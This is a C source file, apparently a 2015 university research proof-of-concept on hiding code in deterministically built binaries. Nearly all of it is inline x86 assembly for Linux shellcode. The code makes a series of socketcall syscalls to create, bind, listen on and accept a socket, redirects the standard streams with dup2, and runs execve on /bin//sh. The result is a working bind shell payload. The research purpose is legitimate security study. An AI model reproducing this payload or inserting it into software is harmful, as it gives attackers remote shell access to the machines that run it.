// Hiding code in deterministically built binaries - Proof-of-Concept - Linux/x86
// Copyright (C) 2015 Christopher Jämthagen, Lund University
//
//   christopher.jamthagen@eit.lth.se
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

int main(int argc, char **argv())
{
    asm(".intel_syntax noprefix");
    //asm(".byte 0xcc");
    asm("jmp _start");

    asm("prologue:");
    asm("pop edi");
    asm("pop ebx");
    asm("pop eax");
    asm("push edi");
    asm("ret");

    asm("epilogue:");
    asm("pop edi");
    asm("pop ecx");
    asm("int 0x80");
    asm("push edi");
    asm("ret");

    asm("_start:");
    //p1
    asm("push 0x66");
    asm("push 0x01");
    asm("call prologue");
    asm("push 0x0");
    asm("push 0x1");
    asm("push 0x2");
    asm("push esp"); 
    asm("call epilogue");
    asm("mov edx, eax");

    //p2
    asm("push 0x66");
    asm("push 0x0e");
    asm("call prologue");
    asm("push 0x04");
    asm("push esp");
    asm("push 0x2");
    asm("push 0x1");
    asm("push edx");
    asm("push esp"); 
    asm("call epilogue");

    //p3
    asm("push 0x66");
    asm("push 0x2");
    asm("call prologue");
    asm("push 0x00");
    asm("xchg ecx,eax");
    asm("mov eax,esp");
    asm("dec eax");
    asm("dec eax");
    asm("push 0x0");
    asm("movb [eax], 0x80");
    asm("dec eax");
    asm("dec eax");
    asm("movb [eax], 0x02");
    asm("xchg ecx,eax");
    asm("mov ecx,esp");
    asm("push 0x10");
    asm("push ecx");
    asm("push edx");
    asm("push esp"); 
    asm("call epilogue");

    //p4
    asm("push 0x66");
    asm("push 0x04");
    asm("call prologue");
    asm("push 0x0");
    asm("push edx");
    asm("push esp");
    asm("call epilogue");

    //p5
    asm("push 0x66");
    asm("push 0x05");
    asm("call prologue");
    asm("push 0x0");
    asm("push 0x0");
    asm("push edx");
    asm("push esp");
    asm("call epilogue");
    asm("mov edx, eax");

    //p6
    asm("push 0x3f");
    asm("push edx");
    asm("call prologue");
    asm("push 0x0");
    asm("call epilogue");

    //p7
    asm("push 0x3f");
    asm("push ebx");
    asm("call prologue");
    asm("push 0x1");
    asm("call epilogue");

    //p8
    asm("push 0x3f");
    asm("push ebx");
    asm("call prologue");
    asm("push 0x2");
    asm("call epilogue");

    //p9
    asm("push 0x0b");
    asm("push ebx");
    asm("call prologue");
    asm("push 0x00");
    asm("xchg eax,ebx");
    asm("mov eax,esp");
    asm("push edx");
    asm("push edx");
    asm("dec eax");
    asm("movb [eax],0x68");
    asm("dec eax");
    asm("movb [eax],0x73");
    asm("dec eax");
    asm("movb [eax],0x2f");
    asm("dec eax");
    asm("movb [eax],0x2f");
    asm("dec eax");
    asm("movb [eax],0x6e");
    asm("dec eax");
    asm("movb [eax],0x69");
    asm("dec eax");
    asm("movb [eax],0x62");
    asm("dec eax");
    asm("movb [eax],0x2f");
    asm("xchg eax,ebx");
    asm("mov ebx,esp");
    asm("xor edx,edx");
    asm("push 0x0");
    asm("call epilogue");
    asm(".att_syntax noprefix");
}
